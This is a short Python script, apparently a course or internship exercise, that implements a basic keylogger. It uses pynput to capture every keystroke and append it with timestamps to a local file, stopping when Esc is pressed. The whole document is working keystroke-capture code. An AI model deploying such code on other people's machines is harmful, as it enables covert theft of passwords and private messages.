"""
    TASK - 04 
    Create a basic keylogger program that records and logs keystrokes.
    Focus on logging the keys pressed and saving them to a fiel
"""
#by Ashwak_N

from pynput import keyboard
import time


log_file = "key_log2.txt"


new_line = True


def write_to_file(data, new_line):
    with open(log_file, "a") as file:
        if new_line:
            
            current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            file.write(f"\n{current_time}: ")  
        file.write(data)


def on_press(key):
    global new_line

    try:
       
        if key == keyboard.Key.space:
            data = " "
        elif key == keyboard.Key.enter:
            data = "\n"  
            new_line = True  
        elif key == keyboard.Key.tab:
            data = "\t"
        elif key == keyboard.Key.backspace:
            data = "<BACKSPACE>"
        elif key == keyboard.Key.esc:
            data = "<ESC>"
        else:
            
            data = str(key).replace("'", "")

        
        write_to_file(data, new_line)
        
        
        if new_line:
            new_line = False

    except Exception as e:
        print(f"Error: {e}")


def on_release(key):
    if key == keyboard.Key.esc:
        return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
